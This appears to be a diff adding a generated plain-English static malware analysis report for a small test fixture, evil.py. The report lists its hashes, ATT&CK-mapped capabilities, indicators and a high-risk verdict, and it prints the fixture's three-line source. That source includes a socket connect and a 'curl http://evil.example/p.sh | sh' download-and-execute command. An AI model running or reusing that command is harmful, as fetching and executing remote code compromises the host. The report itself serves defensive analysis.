@@ -1,0 +1,92 @@
+EVENT ZERO: PLAIN-ENGLISH MALWARE REPORT
+============================================================
+File: evil.py  (113 bytes)
+Path analysed: fixtures/evil.py
+Parser backend: stdlib fallback parser (lief could not parse)   Disassembly available: True
+
+1. IDENTITY AND HASHES
+  md5: 4cd18b20f5df6ece6c87c40aac383b6d
+  sha1: d7f6d25dc28e0589c04741b1269b107814bb4001
+  sha256: bb0b01e6cfc084f93307bb793a97712b584bff2266b5699d37ad169fdedd39cd
+  sha512: 5ace84cc7de9eeecf498afc034c2369bdfc2db3c374c1a3d4c66b055236bd7d00ea7897c9c68fcac6b28ea74dd205d854eabcfee8103fee709f5e1eb69aa2533
+  EICAR test file: False
+
+2. WHAT THIS FILE IS, IN PLAIN ENGLISH
+  This file is called evil.py and it is 113 bytes in size.
+  It is a text / script file for n/a.
+  Its fingerprint (SHA-256) is bb0b01e6cfc084f93307bb793a97712b584bff2266b5699d37ad169fdedd39cd. If anyone else reports this exact fingerprint, they are talking about the exact same file, byte for byte.
+  No imported functions could be listed. That can happen with scripts, stripped files, or formats the parser could not read in detail, and it is recorded as a gap rather than hidden.
+  Here is what the evidence says it can do:
+  - Create a network socket (MITRE ATT&CK T1071.001, Application Layer Protocol: Web Protocols): Opens a network socket, the first step in talking to another machine. Evidence: string/text: socket.
+  - Connect to a remote host (MITRE ATT&CK T1071.001, Application Layer Protocol): Connects out to an address and port. In malware this is often the command and control channel. Evidence: string/text: connect(.
+  - Make HTTP requests (MITRE ATT&CK T1071.001, Application Layer Protocol: Web Protocols): Uses web traffic, which blends in with normal browsing and often passes firewalls. Evidence: string/text: curl, string/text: http://.
+  - Run shell commands (MITRE ATT&CK T1059.004, Command and Scripting Interpreter: Unix Shell): Runs operating system commands, giving the sample the power of a user at a terminal. Evidence: string/text: os.system.
+  - Download and execute a payload (MITRE ATT&CK T1105, Ingress Tool Transfer): Downloads code from the internet and runs it. The file you have is then only a first stage. Evidence: string/text: curl http, string/text: | sh.
+  Packing check: No strong packing signal: whole-file entropy is 4.705/8.0 and no UPX markers were found. Low whole-file entropy can be pulled down by zero padding in Mach-O and ELF files, so this is not proof of no packing.
+  Network names and addresses written inside the file: URLs ['http://evil.example/p.sh'], IP addresses ['10.0.0.5'], domains none. A name written in a file is a lead, not proof the program contacts it.
+  Verdict: HIGH RISK (rule score 70/100).
+  What is not known: Runtime behaviour was not observed: the sample was never executed, so network traffic, timing, and environment checks it performs can only be inferred from static evidence. Script was analysed as source text. Obfuscated or dynamically generated code in it (eval, exec of decoded strings) is flagged as a capability when seen, but its final payload cannot be known without running it in a sandbox.
+
+3. FORMAT AND ARCHITECTURE
+  format: text / script
+  architecture: n/a
+
+4. SECTIONS AND PACKING
+  No strong packing signal: whole-file entropy is 4.705/8.0 and no UPX markers were found. Low whole-file entropy can be pulled down by zero padding in Mach-O and ELF files, so this is not proof of no packing.
+  Overall entropy: 4.705 / 8.0
+
+5. IMPORTED FUNCTIONS, EXPLAINED
+  None could be listed. See Unknowns.
+
+6. STRINGS FOUND IN THE FILE
+  Total: 3 (ASCII 3, UTF-16 0)
+  - import socket,os
+  - s=socket.socket(); s.connect(("10.0.0.5",8080))
+  - os.system("curl http://evil.example/p.sh | sh")
+
+7. DECODED STRINGS (things the file tried to hide)
+  Base64 decoded: none found
+  XOR decoded: none found
+
+8. CAPABILITIES (capa-style, mapped to MITRE ATT&CK)
+  [T1071.001] Create a network socket (Command and Control: Application Layer Protocol: Web Protocols)
+    Opens a network socket, the first step in talking to another machine.
+    Evidence: string/text: socket
+  [T1071.001] Connect to a remote host (Command and Control: Application Layer Protocol)
+    Connects out to an address and port. In malware this is often the command and control channel.
+    Evidence: string/text: connect(
+  [T1071.001] Make HTTP requests (Command and Control: Application Layer Protocol: Web Protocols)
+    Uses web traffic, which blends in with normal browsing and often passes firewalls.
+    Evidence: string/text: curl, string/text: http://
+  [T1059.004] Run shell commands (Execution: Command and Scripting Interpreter: Unix Shell)
+    Runs operating system commands, giving the sample the power of a user at a terminal.
+    Evidence: string/text: os.system
+  [T1105] Download and execute a payload (Command and Control: Ingress Tool Transfer)
+    Downloads code from the internet and runs it. The file you have is then only a first stage.
+    Evidence: string/text: curl http, string/text: | sh
+
+9. DISASSEMBLY AND FUNCTIONS
+  No disassembly for architecture n/a  Instructions shown: 0
+  Script analysis: {'language': 'Python', 'lines': 3, 'imports': ['socket', 'os'], 'calls': ['socket.socket', 's.connect', 'os.system']}
+  Script source excerpt:
+    import socket,os
+    s=socket.socket(); s.connect(("10.0.0.5",8080))
+    os.system("curl http://evil.example/p.sh | sh")
+
+10. INDICATORS OF COMPROMISE (IOCs)
+  urls: ['http://evil.example/p.sh']
+  ip_addresses: ['10.0.0.5']
+  domains: none found
+  file_paths: none found
+
+11. RISK VERDICT
+  HIGH RISK  (rule score 70/100)
+  - Capability detected: exec-shell
+  - Capability detected: exec-download-run
+  - Capability detected: net-connect
+
+12. UNKNOWNS: WHAT STATIC ANALYSIS COULD NOT DETERMINE
+  - Runtime behaviour was not observed: the sample was never executed, so network traffic, timing, and environment checks it performs can only be inferred from static evidence.
+  - Script was analysed as source text. Obfuscated or dynamically generated code in it (eval, exec of decoded strings) is flagged as a capability when seen, but its final payload cannot be known without running it in a sandbox.
+
+End of report. The sample was read as bytes and was never executed.
